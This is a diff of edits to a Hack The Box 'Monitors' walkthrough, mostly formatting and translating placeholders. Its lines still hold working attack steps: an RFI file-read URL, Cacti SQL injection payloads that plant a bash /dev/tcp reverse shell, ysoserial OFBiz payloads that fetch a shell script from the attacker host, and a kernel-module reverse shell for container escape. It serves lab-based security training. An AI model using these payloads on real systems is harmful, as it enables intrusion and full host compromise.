@@ -106,7 +106,7 @@ Once this change is made, after re-running our `Nmap` and `WhatWeb` scans, we no
 
 The most relevant findings from this new scan are that the server is using `WordPress 5.5.1`, which allows us to identify the content management system in use, and confirms that the server is running on `Ubuntu`.
 
-After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses `WordPress`, we can search for common paths such as admin panels, content directories, and other typical CMS routes.
+After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses `WordPress`, we can search for common paths such as admin panels, content directories, and other typical _CMS_ routes.
 
 ![9](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}
 
@@ -118,11 +118,11 @@ wfuzz -c -L -t 400 --hc 404 --hh 12759 -w /usr/share/wordlists/dirbuster/directo
 
 ![10](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}
 
-Among the paths found, we discovered the `wp-admin` admin panel; however, attempting to access it with default known credentials will not be effective in this case.
+Among the paths found, we discovered the `wp-admin` panel; however, attempting to access it with default known credentials will not be effective in this case.
 
 ![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}
 
-We also discovered that the `wp-content` directory is accessible, which represents a configuration error, as this directory contains CMS resources that should be protected. Within this directory, we can perform a second _fuzzing_ (or alternatively, we could manually search for specific paths), which leads us to the `plugins` directory.
+We also discovered that the `wp-content` directory is accessible, which represents a configuration error, as this directory contains _CMS_ resources that should be protected. Within this directory, we can perform a second _fuzzing_ (or alternatively, we could manually search for specific paths), which leads us to the `plugins` directory.
 
 ```
 wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
@@ -140,7 +140,7 @@ By downloading its `readme.txt` file and reviewing it, we confirm that version 1
 
 ![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}
 
-With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using `searchsploit`, or by searching online in the _Exploit Database_.
+With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using `searchsploit`, or by searching online on _Exploit Database_.
 
 ```
 searchsploit spritz
@@ -152,7 +152,7 @@ We find an exploit for this version that exploits a `Remote File Inclusion` (RFI
 
 ![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}
 
-To test this, we can create any text file and, using _Python_, we can host an HTTP server from the same file path to make it accessible via:
+To test this, we can create any text file and, using _Python_, we can host an _HTTP_ server from the same file path to make it accessible via:
 
 ```
 python3 -m http.server 80
@@ -161,12 +161,12 @@ python3 -m http.server 80
 Now, if we point to the URL below, we will see that we can read the contents we wrote in our text file.
 
 ```
-http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://<nuestraIP>:80/<nombreArchivo>
+http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://<ourIP>:80/<nombreArchivo>
 ```
 
 ![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}
 
-However, if we try to load a _reverse shell_, it will not execute because the `RFI` uses the `file_get_contents` function, which simply reads the file content as text, without interpreting or executing any PHP code it contains.
+However, if we try to load a _reverse shell_, it will not execute because the `RFI` uses the `file_get_contents` function, which simply reads the file content as text, without interpreting or executing any _PHP_ code it contains.
 
 ![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}
 
@@ -200,7 +200,7 @@ To better understand this hierarchy and adapt to the specific configurations of 
 
 ![24](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"}
 
-Whether because we suspect there might be additional configurations or because we've carefully examined `Apache's` configuration files, we find clues about the possible existence of additional domains. For instance, in the `ports.conf` file, it mentions that any port changes or additions may require adjustments to the _VirtualHost_ declaration in `/etc/apache2/sites-enabled/000-default.conf`. This reminds us that the server has been applying `virtual hosting` from the start, which could indicate the presence of domains we are not aware of yet.
+Whether because we suspect there might be additional configurations or because we've carefully examined `Apache's` configuration files, we find clues about the possible existence of additional domains. For instance, in the `ports.conf` file, it mentions that any port changes or additions may require adjustments to the _VirtualHost_ statement in `/etc/apache2/sites-enabled/000-default.conf`. This reminds us that the server has been applying `virtual hosting` from the start, which could indicate the presence of domains we are not aware of yet.
 
 ```
 http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
@@ -244,7 +244,7 @@ Once inside, we notice that we are using version `1.2.12` of `Cacti`, which lead
 
 ![31](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}
 
-To check, we can search online in the _Exploit Database_ or directly from the console using `searchsploit`:
+To check, we can search online on _Exploit Database_ or directly from the console using `searchsploit`:
 
 ```
 searchsploit cacti 1.2.12
@@ -282,7 +282,7 @@ http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+S
 
 ![36](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png){:class="blog-image" onclick="expandImage(this)"}
 
-Now we are interested in listing all the tables in the database; for this, we will use the following payload:
+Now we are interested in listing all the tables in the database; for this, we will use the following _payload_:
 
 ```
 http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
@@ -311,7 +311,7 @@ This reveals two users: _admin_ and _guest_, although their passwords are hashed
 However, there is a second injection that allows us to obtain a _reverse shell_ inside the machine. This injection is performed as follows:
 
 ```
-http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UPDATE+settings+SET+value='bash -i >& /dev/tcp/<nuestraIP>/443 0>&1;'+WHERE+name='path_php_binary';--+-
+http://cacti-admin.monitors.htb/cacti/color.php?action=export&filter=1')+UPDATE+settings+SET+value='bash -i >& /dev/tcp/<ourIP>/443 0>&1;'+WHERE+name='path_php_binary';--+-
 ```
 
 By modifying the `path_php_binary` parameter in the _settings_ table to point to a _reverse shell_ instead of the PHP executable, we manage to execute our command. This happens because `Cacti` uses the value of this parameter in the `host_reindex()` function, located in the file [host.php](https://github.com/Cacti/cacti/blob/develop/host.php). The logic behind this is as follows:
@@ -363,9 +363,7 @@ We can navigate to [http://cacti-admin.monitors.htb/cacti/host.php?action=reinde
 curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
 ```
 
-By doing so, we manage to establish the reverse shell, gaining direct access to the machine.
-
-Once inside the machine, we can confirm our presence in the system using the following command:
+By doing so, we manage to establish the reverse shell, gaining direct access to the machine. Once inside the machine, we can confirm our presence in the system using the following command:
 
 ```
 hostname -I
@@ -381,9 +379,9 @@ To verify if `Docker` is active on the machine, we can check if the `Docker` soc
 ls -l /var/run/docker.sock
 ```
 
-This shows that the socket is owned by the user _root_ and the group _docker_, indicating that access to the Docker daemon is restricted to these users and members of the _docker_ group. This means that our current user doesn't have permission to interact with Docker directly, so commands like `docker ps` or `docker info` won't be effective.
+This shows that the socket is owned by the user _root_ and the group _docker_, indicating that access to the _Docker daemon_ is restricted to these users and members of the _docker_ group. This means that our current user doesn't have permission to interact with `Docker` directly, so commands like `docker ps` or `docker info` won't be effective.
 
-Another way to confirm if Docker is running is to inspect active processes with:
+Another way to confirm if `Docker` is running is to inspect active processes with:
 
 ```
 ps aux | grep dockerd
@@ -471,7 +469,7 @@ On the other hand, the `bi` and `example` paths lead us to an authentication pan
 
 ![53](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png){:class="blog-image" onclick="expandImage(this)"}
 
-As we have been doing, we will investigate whether this version of `Apache OFBiz` has any known vulnerabilities that we can exploit. We can do this by searching online, in _Exploit Database_, or directly from the console using `searchsploit`:
+As we have been doing, we will investigate whether this version of `Apache OFBiz` has any known vulnerabilities that we can exploit. We can do this by searching online, on _Exploit Database_, or directly from the console using `searchsploit`:
 
 ```
 searchsploit ofbiz 17.12.01
@@ -489,7 +487,7 @@ Next, we will write a _reverse shell_ in _Bash_. This _reverse shell_ will allow
 
 ```bash
 #!/bin/bash
-/bin/bash -i >& /dev/tcp/<nuestraIP>/443 0>&1
+/bin/bash -i >& /dev/tcp/<ourIP>/443 0>&1
 ```
 
 ![56](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/56.png){:class="blog-image" onclick="expandImage(this)"}
@@ -497,7 +495,7 @@ Next, we will write a _reverse shell_ in _Bash_. This _reverse shell_ will allow
 Next, we will generate the _payload_ in _JAR_ format, using the `CommonsBeanutils1` class. This class is part of _Apache Commons_ and has been exploited in the past to execute arbitrary code in serialized objects. By using `ysoserial` together with `CommonsBeanutils1`, we can embed commands into a serialized object that the server will execute when it _deserializes_ it. In this case, the _payload_ is designed so that the server will download our `shell.sh` file into the victim machine's temporary directory (`/tmp`). We will encode the output of the _payload_ in `base64` to facilitate transmission and avoid issues during the process:
 
 ```
-java -jar ysoserial-all.jar CommonsBeanutils1 "wget <nuestraIP>/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"; echo
+java -jar ysoserial-all.jar CommonsBeanutils1 "wget <ourIP>/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"; echo
 ```
 
 ![57](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/57.png){:class="blog-image" onclick="expandImage(this)"}
@@ -514,7 +512,7 @@ With this server running, we can now send our first _payload_ to the target serv
 curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "<?xml version='1.0'?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'> PAYLOAD </serializable></value></member></struct></value></param></params></methodCall>" -k  -H 'Content-Type:application/xml' &>/dev/null
 ```
 
-Here, `PAYLOAD` is the _base64_ content that we generated in the previous step.
+Here, `PAYLOAD` is the `base64` content that we generated in the previous step.
 
 ![58](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/58.png){:class="blog-image" onclick="expandImage(this)"}
 
@@ -526,7 +524,7 @@ java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr
 
 ![59](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png){:class="blog-image" onclick="expandImage(this)"}
 
-Before sending this second _payload_, we will set our machine to listen using `Netcat` to receive the reverse shell:
+Before sending this second _payload_, we will set our machine to listen using `Netcat` to receive the _reverse shell_:
 
 ```
 nc -nlvp 443
@@ -560,7 +558,7 @@ capsh --print
 
 Among the _capabilities_ found in the container, we identified `CAP_DAC_OVERRIDE` and `CAP_SYS_MODULE`, both of which we could attempt to exploit. With `CAP_DAC_OVERRIDE`, we could write to the host machine's filesystem. However, for this to be possible, the `CAP_DAC_READ_SEARCH` capability must also be present, which is not the case here, so this exploitation path is not viable. Instead, we can exploit `CAP_SYS_MODULE`.
 
-This _capability_ allows processes to load and unload _kernel modules_, enabling us to inject code directly into the system's _kernel_. Since containers are isolated at the operating system (OS) level but share the _kernel_ with the host system, this _capability_ allows us to interact with it through the container. This enables us to fully compromise the system by modifying the _kernel_ and bypassing all Linux security barriers, including security modules and the container's isolation itself.
+This _capability_ allows processes to load and unload _kernel modules_, enabling us to inject code directly into the system's _kernel_. Since containers are isolated at the operating system (OS) level but share the _kernel_ with the host system, this _capability_ allows us to interact with _it_ through the container. This enables us to fully compromise the system by modifying the _kernel_ and bypassing all Linux security barriers, including security modules and the container's isolation itself.
 
 To take advantage of the `CAP_SYS_MODULE` capability and escape the container, we will write a _kernel module_ that opens a _reverse shell_ to our attacker machine. This module will be compiled using a _Makefile_, and then injected into the host system's _kernel_ to execute the code.
 
@@ -570,7 +568,7 @@ We will write a `reverse-shell.c` file that contains the code for the _kernel mo
 #include <linux/kmod.h>
 #include <linux/module.h>
 
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<nuestraIP>/4444 0>&1", NULL};
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<ourIP>/4444 0>&1", NULL};
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
 static int __init reverse_shell_init(void) {
@@ -614,11 +612,11 @@ python3 -m http.server 80
 From the container, we will download the two files we just created using `wget`.
 
 ```
-wget http://<nuestraIP>:80/reverse-shell.c
+wget http://<ourIP>:80/reverse-shell.c
 ```
 
 ```
-wget http://<nuestraIP>:80/Makefile
+wget http://<ourIP>:80/Makefile
 ```
 
 ![64](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/64.png){:class="blog-image" onclick="expandImage(this)"}
